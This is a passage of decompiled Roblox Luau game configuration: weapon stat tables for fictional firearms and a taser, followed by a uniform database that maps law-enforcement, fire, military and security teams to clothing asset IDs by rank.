		Flashlight = {
			Type = "toggle", 
			Label = "Flashlight", 
			Function = function(p1, p2)
				local l__Flashlight__3 = p1.Flashlight;
				local v4 = l__Flashlight__3.Material ~= Enum.Material.Neon;
				l__Flashlight__3.Material = v4 and Enum.Material.Neon or Enum.Material.SmoothPlastic;
				l__Flashlight__3.SpotLight.Enabled = v4;
			end, 
			Key = Enum.KeyCode.B, 
			Debounce = 0.2
		}
	}

};
v1.Hawth500 = {
	Asset = "Hawth500", 
	BaseDamage = 100, 
	Multipliers = {
		["Right Arm"] = { 0.5, 0.6 }, 
		["Left Arm"] = { 0.5, 0.6 }, 
		Torso = { 1.4, 1.6 }, 
		Head = { 2, 2.8 }, 
		["Right Leg"] = { 0.7, 0.8 }, 
		["Left Leg"] = { 0.7, 0.8 }
	}, 
	Spread = 3, 
	MagSize = 8, 
	Rounds = "12g", 
	Range = 984, 
	FoV = 55, 
	Type = "Firearm", 
	Multishot = true, 
	Recoil = 7
};
v1.StetsonM2A = {
	Asset = "StetsonM2A", 
	--Multishot = true, 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.4, 
	Magazine = true, 
	Rounds = "556", 
	Auto = true, 
	Range = 1000, 
	FoV = 45, 
	Type = "Firearm", 
	Recoil = 2.3,
	Abilities = {
		Flashlight = {
			Type = "toggle", 
			Label = "Flashlight", 
			Function = function(p1, p2)
				local l__Flashlight__3 = p1.Flashlight;
				local v4 = l__Flashlight__3.Material ~= Enum.Material.Neon;
				l__Flashlight__3.Material = v4 and Enum.Material.Neon or Enum.Material.SmoothPlastic;
				l__Flashlight__3.SpotLight.Enabled = v4;
			end, 
			Key = Enum.KeyCode.B, 
			Debounce = 0.2
		}
	}

};
v1.Hawth500C = v1.Hawth500;
v1.Hawth500ASPS = v1.Hawth500;
v1.DelinoDef = {
	Asset = "DelinoDef", 
	BaseDamage = 28, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2, 2.5 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.25, 
	MagSize = 6, 
	Rounds = ".44", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 6
};
v1.DelinoSpec = {
	Asset = "DelinoSpec", 
	BaseDamage = 34, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.4, 3 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.6, 
	MagSize = 6, 
	Rounds = ".44", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 7
};
v1.Benn17 = {
	Asset = "Benn17", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.15, 
	Magazine = true, 
	Rounds = "9mm", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 3
};
v1.Delino1711 = {
	Asset = "Delino1711", 
	BaseDamage = 29, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.15, 
	Magazine = true, 
	Rounds = ".45", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 3
};
v1.SigP226 = {
	Asset = "SigP226", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.15, 
	Magazine = true, 
	Rounds = "9mm", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 3
};
v1.Benn17C = v1.Benn17;
v1.DelinoR21 = {
	Asset = "DelinoR21", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.2, 
	Magazine = true, 
	Rounds = "556", 
	Auto = false, 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 2.5
};
v1.DelinoR21A = {
	Asset = "DelinoR21A", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.2, 
	Magazine = true, 
	Rounds = "556", 
	Auto = true, 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 2.5
};
v1.DelinoR21AC = v1.DelinoR21A;
v1.DelinoR21ASPS = v1.DelinoR21;
v1.DelinoR21M = {
	Asset = "DelinoR21M", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.2, 
	Magazine = true, 
	Rounds = "556", 
	Auto = true, 
	Range = 1000, 
	FoV = 25, 
	Type = "Firearm", 
	Recoil = 2.5, 
	Abilities = {
		Flashlight = {
			Type = "toggle", 
			Label = "Flashlight", 
			Function = function(p1, p2)
				local l__Flashlight__3 = p1.Flashlight;
				local v4 = l__Flashlight__3.Material ~= Enum.Material.Neon;
				l__Flashlight__3.Material = v4 and Enum.Material.Neon or Enum.Material.SmoothPlastic;
				l__Flashlight__3.SpotLight.Enabled = v4;
			end, 
			Key = Enum.KeyCode.B, 
			Debounce = 0.2
		}
	}
};
v1.TI26 = {
	Asset = "TI26", 
	Spread = 0.25, 
	Rounds = "cart", 
	MagSize = 1, 
	Range = 35, 
	FoV = 60, 
	Type = "Taser", 
	NoSmash = true,
	Recoil = 2,
	Abilities = {
		Flashlight = {
			Type = "toggle", 
			Label = "Flashlight", 
			Function = function(p1, p2)
				local l__Flashlight__3 = p1.Flashlight;
				local v4 = l__Flashlight__3.Material ~= Enum.Material.Neon;
				l__Flashlight__3.Material = v4 and Enum.Material.Neon or Enum.Material.SmoothPlastic;
				l__Flashlight__3.SpotLight.Enabled = v4;
			end, 
			Key = Enum.KeyCode.B, 
			Debounce = 0.2
		}
	}
};
return v1;
database.uniforms

-- Decompiled with the Synapse X Luau decompiler.

local function v1(p1)
	return {
		["Infantry Beret"] = { "NGInfantryBeret" }, 
		["MP Beret"] = { "NGMPBeret" }, 
		["Logistics Beret"] = { "NGLogisticsBeret" }, 
		["18X Beret"] = { "NG18XBeret" }, 
		Cover = { p1 }
	};
end;
local function v2(p2, p3)
	local v3 = {};
	for v4 = 1, #p2 do
		v3[v4] = p2[v4];
	end;
	v3[#v3 + 1] = p3;
	return {
		["No Vest"] = p2, 
		Vest = v3
	};
end;
return {
	SheriffTeam = {
		["Plain Clothes"] = { { nil, nil, nil, {
			["No Vest"] = { "BaseDutyBelt" }, 
			Vest = { "BaseDutyBelt", "SheriffVest" }, 
			["WEB Vest"] = { "WarrantBureauVest", "BaseDutyBelt" }
		}, true } }, 
		["Class A"] = {
			[28] = { 2049805231, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[56] = { 2049804792, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[72] = { 3607355978, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[84] = { 2049804629, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[112] = { 2049804995, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[140] = { 2049667577, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[168] = { 2049666661, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }, 
			[182] = { 3607356896, 1530299383, nil, v2({ "SheriffGold", "BaseDutyBelt" }, "SheriffVest") }, 
			[196] = { 2049668059, 1530299383, nil, v2({ "SheriffGold", "BaseDutyBelt" }, "SheriffVest") }, 
			[224] = { 2049667913, 1530299383, nil, v2({ "SheriffGold", "BaseDutyBelt" }, "SheriffVest") },
			[255] = { 2049667913, 1530299383, nil, v2({ "SheriffGold", "BaseDutyBelt" }, "SheriffVest") },
			{ 2049805231, 1530299383, nil, v2({ "SheriffSilver", "BaseDutyBelt" }, "SheriffVest") }
		}, 
		Jacket = {
			{ 5743169683, 1530299383, nil, ({ "SheriffSilver", "BaseDutyBelt" }) }
		}, 
		WEB = { { 3057955409, 3057955997, nil, { "SheriffCap", "WarrantBureauVest", "BaseDutyBelt" }, true } }, 
		Polo = {
			[7] = { 4862675361, 1127238288, nil, { "SheriffCap", "BaseDutyBelt" }, true }, 
			[14] = { 2692536387, 1127238288, nil, { "SheriffCap", "BaseDutyBelt" }, true },
			[255] = { 2692536387, 1127238288, nil, { "SheriffCap", "BaseDutyBelt" }, true },
			{ 4862675361, 1127238288, nil, { "SheriffCap", "BaseDutyBelt" }, true }
		}, 
		Formals = {
			[28] = { 6475259688, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } },  --deputy
			[56] = { 6475263069, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } }, -- deputy first class
			[72] = { 6475268232, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } },  -- deputy second grade
			[84] = { 6475271341, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } },  --corporal
			[112] = { 6475273369, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } }, --Sergeant 
			[140] = { 6475275454, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } }, --Lieutenant 
			[168] = { 6475278087, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } }, --Captain 
			[182] = { 6475285336, 6475291656, nil, { "SheriffGold", "BaseDutyBelt" } }, --assistant sheriff
			[196] = { 6475288111, 6475291656, nil, { "SheriffGold", "BaseDutyBelt" } }, --Undersheriff 
			[224] = { 6475290534, 6475291656, nil, { "SheriffGold", "BaseDutyBelt" } },--Sheriff 
			[255] = { 6475290534, 6475291656, nil, { "SheriffGold", "BaseDutyBelt" } },
			{ 6475259688, 6475291656, nil, { "SheriffSilver", "BaseDutyBelt" } }
		}
	}, 
	PPDTeam = {
		["Plain Clothes"] = { { nil, nil, nil, {
			["No Vest"] = { "BaseDutyBelt" }, 
			Vest = { "BaseDutyBelt", "PoliceVest" }, 
			["Plate Vest"] = { "PlymouthPlateVest", "BaseDutyBelt" }
		}, true } }, 
		["Class A"] = {
			[10] = { 104740077201159, 18364926631, nil, v2({ "PPDOfficer", "BaseDutyBelt" }, "PoliceVest") }, 
			[20] = { 104740077201159, 18364926631, nil, v2({ "PPDOfficer", "BaseDutyBelt" }, "PoliceVest") }, 
			[25] = { 104740077201159, 18364926631, nil, v2({ "PPDOfficer", "BaseDutyBelt" }, "PoliceVest") }, 
			[30] = { 104740077201159, 18364926631, nil, v2({ "PPDOfficer", "BaseDutyBelt" }, "PoliceVest") }, 
			[35] = { 104740077201159, 18364926631, nil, v2({ "PPDOfficer", "BaseDutyBelt" }, "PoliceVest") }, 
			[40] = { 104740077201159, 18364926631, nil, v2({ "PPDSgt", "BaseDutyBelt" }, "PoliceVest") }, 
			[60] = { 104740077201159, 18364926631, nil, v2({ "PPDCapt", "BaseDutyBelt" }, "PoliceVest") }, 
			[80] = { 104740077201159, 18364926631, nil, v2({ "PPDCapt", "BaseDutyBelt" }, "PoliceVest") }, 
			[90] = { 104740077201159, 18364926631, nil, v2({ "PPDCapt", "BaseDutyBelt" }, "PoliceVest") }, 
			[100] = { 104740077201159, 18364926631, nil, v2({ "PPDCapt", "BaseDutyBelt" }, "PoliceVest") },
			[255] = { 104740077201159, 18364926631, nil, v2({ "PPDCapt", "BaseDutyBelt" }, "PoliceVest") },
			{ 18364926631, 104740077201159, nil, v2({ "PPDOfficer", "BaseDutyBelt" }, "PoliceVest") }
		}, 
		Traffic = {
			[10] = { 1097802145, 1097609190, nil, { "PPDOfficer", "BaseDutyBelt" } }, 
			[20] = { 1097802145, 1097609190, nil, { "PPDOfficer", "BaseDutyBelt" } }, 
			[30] = { 1097802145, 1097609190, nil, { "PPDOfficer", "BaseDutyBelt" } }, 
			[35] = { 1097802145, 1097609190, nil, { "PPDOfficer", "BaseDutyBelt" } }, 
			[40] = { 1097802145, 1097609190, nil, { "PPDSgt", "BaseDutyBelt" } }, 
			[60] = { 1097802145, 1097609190, nil, { "PPDCapt", "BaseDutyBelt" } }, 
			[80] = { 1097802145, 1097609190, nil, { "PPDCapt", "BaseDutyBelt" } }, 
			[90] = { 1097802145, 1097609190, nil, { "PPDCapt", "BaseDutyBelt" } }, 
			[100] = { 1097802145, 1097609190, nil, { "PPDCapt", "BaseDutyBelt" } },
			[255] = { 1097802145, 1097609190, nil, { "PPDCapt", "BaseDutyBelt" } },
			{ 1097802145, 1097609190, nil, { "PPDOfficer", "BaseDutyBelt" } }
		}, 
		Polo = {
			[10] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt" }, true }, 
			[20] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt" }, true }, 
			[30] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true }, 
			[35] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true }, 
			[40] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true }, 
			[60] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true }, 
			[80] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true }, 
			[90] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true }, 
			[100] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true },
			[255] = { 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt", "Sunglasses" }, true },
			{ 1108327126, 1108328023, nil, { "PoliceCap", "BaseDutyBelt" }, true }
		}, 
		Formals = {
			[10] = { 2692257763, 1550293744, nil, { "PPDOfficer","BaseDutyBelt" } }, 
			[20] = { 2692257763, 1550293744, nil, { "PPDOfficer","BaseDutyBelt" } }, 
			[25] = { 4683454525, 1550293744, nil, { "PPDOfficer","BaseDutyBelt" } }, 
			[30] = { 4860030531, 1550293744, nil, { "PPDOfficer","BaseDutyBelt" } }, 
			[35] = { 2692259171, 1550293744, nil, { "PPDOfficer","BaseDutyBelt" } }, 
			[40] = { 2692260128, 1550293744, nil, { "PPDSgt","BaseDutyBelt" } }, 
			[60] = { 1942086965, 1550305758, nil, { "PPDCapt" ,"BaseDutyBelt"} }, 
			[80] = { 1942085215, 1550305758, nil, { "PPDCapt" ,"BaseDutyBelt"} }, 
			[90] = { 1942083472, 1550305758, nil, { "PPDCapt" ,"BaseDutyBelt"} }, 
			[100] = { 1942080788, 1550305758, nil, { "PPDCapt","BaseDutyBelt" } },
			[255] = { 1942080788, 1550305758, nil, { "PPDCapt","BaseDutyBelt" } },
			{ 2692257763, 1550293744, nil, { "PPDOfficer","BaseDutyBelt" } }
		}
	}, 
	WPPDTeam = {
		["Plain Clothes"] = { { nil, nil, nil, {
			["No Vest"] = { "BaseDutyBelt" }, 
			Vest = { "BaseDutyBelt", "WPPDVest" }, 
			["Plate Vest"] = { "WPPDPlateVest", "BaseDutyBelt" }
		}, true } }, 
		["Class A"] = {
			{ 6704739254, 1496301596, nil, v2({ "WPPDGrunt", "BaseDutyBelt" }, "WPPDVest") }
		}, 
	}, 
	MSPTeam = {
		["Plain Clothes"] = { { nil, nil, nil, {
			["No Vest"] = { "MSPBaseDutyBelt" }, 
			Vest = { "MSPBaseDutyBelt", "TrooperVest" }, 
			["SOB Vest"] = { "SOBVest", "MSPBaseDutyBelt" }
		}, true } }, 
		["Class A"] = {
			[16] = { 1157342294, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[32] = { 2102054528, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[48] = { 3379711835, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[56] = { 1307141296, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[64] = { 1307141641, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[96] = { 1157559858, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[128] = { 1157560446, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[160] = { 1157560731, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[192] = { 1141998591, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }, 
			[224] = { 1141998591, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") },
			[255] = { 1141998591, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") },
			{ 1157342294, 1157348775, nil, v2({ "StateHat", "MSPBaseDutyBelt" }, "TrooperVest") }
		}, 
		["Training Polo"] = { { 1157561073, 1157348775, nil, { "StateHat", "MSPBaseDutyBelt" } } }, 
		SOB = { { 5523141151, 2692312887, nil, { "SOBVest", "BlackHelmet", "Balaclava", "MSPBaseDutyBelt" }, true } },
		["Protection Suit"] = {
			{ 2629096324, 2629098507, nil, {"MSPBaseDutyBelt" }, true }, 
		},


		["SOB UBAC"] = { { 5629026918, 2692312887, nil, { "SOBVest", "MSPBaseDutyBelt" }, true } }

	}, 
	LPDTeam = {
		["Plain Clothes"] = { { nil, nil, nil, {
			["No Vest"] = { "BaseDutyBelt" }, 
			Vest = { "BaseDutyBelt", "PoliceVest" }, 
			["Plate Vest"] = { "LanderPlateVest", "BaseDutyBelt" }
		}, true } }, 
		["Class A"] = {
			[55] = { 2260384279, 2260391768, nil, v2({ "BaseDutyBelt", "LPDGrunt" }, "PoliceVest") }, 
			[80] = { 2260384862, 2260391768, nil, v2({ "BaseDutyBelt", "LPDGrunt" }, "PoliceVest") }, 
			[105] = { 2397080512, 2260391768, nil, v2({ "BaseDutyBelt", "LPDGrunt" }, "PoliceVest") }, 
			[130] = { 2260385147, 2260391768, nil, v2({ "BaseDutyBelt", "LPDHigh" }, "PoliceVest") }, 
			[155] = { 2260385375, 2260391768, nil, v2({ "BaseDutyBelt", "LPDHigh" }, "PoliceVest") }, 
			[180] = { 2260385988, 2260391768, nil, v2({ "BaseDutyBelt", "LPDHigh" }, "PoliceVest") }, 
			[205] = { 2260386253, 2260391768, nil, v2({ "BaseDutyBelt", "LPDHigh" }, "PoliceVest") }, 
			[230] = { 2260386478, 2260391768, nil, v2({ "BaseDutyBelt", "LPDHigh" }, "PoliceVest") },
			[255] = { 2260386478, 2260391768, nil, v2({ "BaseDutyBelt", "LPDHigh" }, "PoliceVest") },
			{ 2260384279, 2260391768, nil, v2({ "BaseDutyBelt", "LPDGrunt" }, "PoliceVest") }
		}, 
		Formals = {
			[55] = { 2253167321, 2253330317, nil, { "BaseDutyBelt", "LPDGrunt" } }, 
			[80] = { 2397081256, 2253330317, nil, { "BaseDutyBelt", "LPDGrunt" } }, 
			[105] = { 2397080862, 2253330317, nil, { "BaseDutyBelt", "LPDGrunt" } }, 
			[130] = { 2253167492, 2253330317, nil, { "BaseDutyBelt", "LPDHigh" } }, 
			[155] = { 2253166960, 2253330156, nil, { "BaseDutyBelt", "LPDHigh" } }, 
			[180] = { 2253166614, 2253330156, nil, { "BaseDutyBelt", "LPDHigh" } }, 
			[205] = { 2253166389, 2253330156, nil, { "BaseDutyBelt", "LPDHigh" } }, 
			[230] = { 2253166816, 2253330156, nil, { "BaseDutyBelt", "LPDHigh" } },
			[255] = { 2253166816, 2253330156, nil, { "BaseDutyBelt", "LPDHigh" } },
			{ 2253167321, 2253330317, nil, { "BaseDutyBelt", "LPDGrunt" } }
		}, 
		["Training Polo"] = { { 5062872600, 2260850200, nil, { "BaseDutyBelt", "PoliceCap" }, true } },
		["TRU"] = {
			{ 5696379013, 5629243137, nil, {"BaseDutyBelt", "LanderPlateVest" }, true }, 

		},
	}, 
	FireDepTeam = {
		["Station Dress"] = {
			[26] = { 986991764, 986993781, nil, { "NormBellCap" } }, 
			[52] = { 986991764, 986993781, nil, { "NormBellCap" } }, 
			[78] = { 986991764, 986993781, nil, { "NormBellCap" } }, 
			[104] = { 986992123, 986993781, nil, { "LieutCaptBellCap" } }, 
			[130] = { 986992491, 986993781, nil, { "LieutCaptBellCap" } }, 
			[156] = { 986992738, 986993781, nil, { "AsstDeptBellCap" } }, 
			[182] = { 986993204, 986993781, nil, { "AsstDeptBellCap" } }, 
			[208] = { 986740984, 986993781, nil, { "ChiefBellCap" } },
			[255] = { 986740984, 986993781, nil, { "ChiefBellCap" } },
			{ 986991764, 986993781, nil, { "NormBellCap" } }
		}, 
		Turnouts = {
			[26] = { 1010226529, 1010230075, nil, { "FireCadetHelmet" }, true }, 
			[52] = { 1010227068, 1010230075, nil, { "FireFighterHelmet" }, true }, 
			[78] = { 1010227523, 1010230075, nil, { "FireMedicHelmet" }, true }, 
			[104] = { 1010227523, 1010230075, nil, { "FireMedicHelmet" }, true }, 
			[130] = { 1010228161, 1010230075, nil, { "FireLieutenantHelmet" }, true }, 
			[156] = { 1010228454, 1010230075, nil, { "FireCaptainHelmet" }, true }, 
			[182] = { 1010228774, 1010230075, nil, { "FireDeptChiefHelmet" }, true }, 
			[208] = { 1010229331, 1010230075, nil, { "FireChiefHelmet" }, true },
			[255] = { 1010229331, 1010230075, nil, { "FireChiefHelmet" }, true },
			{ 1010226529, 1010230075, nil, { "FireCadetHelmet" }, true }
		}
	},
	Inmate = {
		["Inmate Clothes"] = { { 1136906381, 1141056528, nil, nil, true } }
	}, 
	LETI = {
		["LETI Uniform"] = {
			[28] = { 1127222231, 1127223205, nil, {} }, 
			[140] = { 1127222231, 1127223205, nil, {} }, 
			[168] = { 1127222733, 1127223205, nil, {} }, 
			[196] = { 1127222733, 1127223205, nil, {} }, 
			[224] = { 1127222733, 1127223205, nil, {} }, 
			[240] = { 1127222733, 1127223205, nil, {} }, 
			[254] = { 1127222733, 1127223205, nil, {} },
			[255] = { 1127222733, 1127223205, nil, {} },
			{ 1127222231, 1127223205, nil, {} }
		}
	}, 
	MNGTeam = {
		["Class A"] = {
			[25] = { 4866471900, 4866602242, nil, v1("NGPvt") }, 
			[30] = { 4866553250, 4866602242, nil, v1("NGPvt") }, 
			[45] = { 4866555079, 4866602242, nil, v1("NGPvt") }, 
			[60] = { 4866556419, 4866602242, nil, v1("NGPvt") }, 
			[75] = { 4866557983, 4866602242, nil, v1("NGPvt") }, 
			[90] = { 4866567793, 4866602242, nil, v1("NGPvt") }, 
			[105] = { 4866574625, 4866602242, nil, v1("NGPvt") }, 
			[120] = { 4866577286, 4866602242, nil, v1("NG2Lt") }, 
			[135] = { 4866579580, 4866602242, nil, v1("NG2Lt") }, 
			[150] = { 4866581528, 4866602242, nil, v1("NG2Lt") }, 
			[165] = { 4866582990, 4866602242, nil, v1("NG2Lt") }, 
			[180] = { 4866586403, 4866602242, nil, v1("NGLtCol") }, 
			[195] = { 4866591026, 4866602242, nil, v1("NGLtCol") }, 
			[210] = { 4866594719, 4866602242, nil, v1("NGLtCol") }, 
			[225] = { 4866599681, 4866602242, nil, v1("NGLtCol") },
			[255] = { 4866599681, 4866602242, nil, v1("NGLtCol") },
			{ 4866470276, 4866602242, nil, v1("NGPvt") }
		}, 
		BDU = { { 4882101848, 5022447876, nil, {
			["Patrol Cap"] = { "NGCap" }, 
			["Logistics Beret"] = { "NGLogisticsBeret" }, 
			["Infantry Beret"] = { "NGInfantryBeret" }
		} } }, 
		["18X"] = { { 4882102673, 4882102383, nil, {
			["Boonie Smock"] = { "NGBoonie" }, 
			["Boonie Combats"] = { "NGBoonie", "NGWebbingVest" }, 
			["Beret Smock"] = { "NG18XBeret" }, 
			["Beret Combats"] = { "NG18XBeret", "NGWebbingVest" }
		} } }, 
		Combats = { { 4882102133, 4882100977, nil, { "NGHelmet", "NGWebbingVest" } } }
	}, 
	MNGMP = {
		["Plain Clothes"] = { { nil, nil, nil, { "BaseDutyBelt" }, true } }, 
		["MP BDU"] = { { 4882101252, 5022447876, nil, {
			["Patrol Cap"] = { "NGCap", "BaseDutyBelt" }, 
			["MP Beret"] = { "NGMPBeret", "BaseDutyBelt" }
		} } }, 
		["MP Combats"] = { { 4883367817, 5022447876, nil, { "NGHelmet", "NGWebbingVest" } } }
	}, 
	PWTeam = {
		["Plain Clothes"] = { { nil, nil, nil, { "PAWDutyBelt" }, true } }, 
		["Class A"] = {
			[43] = { 2695526577, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }, 
			[86] = { 2695527102, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }, 
			[129] = { 2695526234, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }, 
			[172] = { 2695527436, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }, 
			[182] = { 3607355234, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }, 
			[192] = { 2695525562, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }, 
			[212] = { 2695525877, 2695528610, nil, { "PWHat", "PAWDutyBelt" } },
			[255] = { 2695525877, 2695528610, nil, { "PWHat", "PAWDutyBelt" } },
			{ 2702050346, 2695528610, nil, { "PWHat", "PAWDutyBelt" } }
		}, 
		["Class B"] = {
			[43] = { 2695526746, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }, 
			[86] = { 2695527303, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }, 
			[129] = { 2695526375, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }, 
			[172] = { 2695527615, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }, 
			[182] = { 3607355550, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }, 
			[192] = { 2695525733, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }, 
			[212] = { 2695526027, 2714544744, nil, { "PWHat", "PAWDutyBelt" } },
			[255] = { 2695526027, 2714544744, nil, { "PWHat", "PAWDutyBelt" } },
			{ 2695526746, 2714544744, nil, { "PWHat", "PAWDutyBelt" } }
		}, 
		Formals = { { 2695525321, 2695528306, nil, { "PWHat","PAWDutyBelt" } } }, 
		Reflective = { { 2871486663, 2714544744, nil, { "PWHat", "PAWDutyBelt" } } }
	}, 
	NHTATeam = {
		["Overalls"] = {
			{ 2691769444, 2691767640, nil, {"Blank" }, true }, 
		},
		["Bus Operator"] = { { 2691153258, 2691152061, nil, { "BusCap" } } }
	}, 
	Carpathian = {
		["Security Uniform"] = {
			[20] = { 3433849578, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") }, 
			[40] = { 3626892314, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") }, 
			[50] = { 3627569171, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") }, 
			[60] = { 3629805822, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") }, 
			[70] = { 3433849578, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") }, 
			[254] = { 3629825799, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") },
			[255] = { 3629825799, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") },
			{ 3433849578, 3433850365, nil, v2({ "McDoogleBelt", "McDoogleHat" }, "McDoogleVest") }
		}, 
		["Security Polo"] = { { 4210127322, 3433850365, nil, { "McDoogleBelt", "Sunglasses" } } }, 
		["Plain Clothes"] = { { nil, nil, nil, v2({ "McDoogleBelt" }, "McDoogleVest"), true } }
	}, 
	ASPSGroup = {
		["Security‎‎"] = {
			{ 6533428663, 6533429419, nil, v2({ "ASPSBelt" }, "ASPSVest"), true }
		}, 
		["Plain Clothes"] = { { nil, nil, nil, v2({ "ASPSBelt" }, "ASPSVest"), true } }
	}, 
